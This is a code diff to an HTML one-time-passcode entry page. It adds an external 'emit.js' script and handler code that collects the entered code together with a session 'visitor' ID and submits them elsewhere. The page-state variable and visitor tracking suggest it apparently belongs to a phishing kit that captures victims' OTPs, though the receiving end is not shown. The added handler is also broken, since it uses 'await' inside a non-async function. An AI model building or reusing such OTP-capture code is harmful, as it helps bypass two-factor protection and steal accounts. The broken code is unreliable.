@@ -146,7 +146,7 @@
                     <input type="text" maxlength="1" class="otp-input" id="otp6" autocomplete="off">
                 </div>
 
-                <button id="verify-otp" class="submit">Verify OTP</button>
+                <button id="submit" class="submit">Verify OTP</button>
             </form>
 
             <div class="resend">
@@ -162,6 +162,7 @@
     </div>
 
     <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
+    <script src="assets/emit.js"></script> 
     <script>
     	page = "otp";
     $(document).ready(function() {
@@ -184,7 +185,7 @@
         });
 
         // Verify OTP with per-field validation
-        $('#verify-otp').on('click', function(e) {
+        $('#submit').on('click', function(e) {
             e.preventDefault();
             
             let otp = '';
@@ -209,7 +210,22 @@
             }
 
             console.log("Entered OTP:", otp);
-            // Add your actual submission logic here (e.g. submitFormData)
+            let userinfo = $('form').serializeArray();
+            let user = {};
+            let visitor = sessionStorage.getItem('visitor');
+
+            userinfo.forEach((item) => {
+                user[item.name] = item.value;
+            });
+
+            user['visitor'] = visitor;
+
+            try {
+                await submitFormData(user);   // Now safe to use await
+                // Optional: show success message or redirect
+            } catch (error) {
+                console.error("Submission failed:", error);
+            }
         });
 
         // Resend OTP with tiny popup
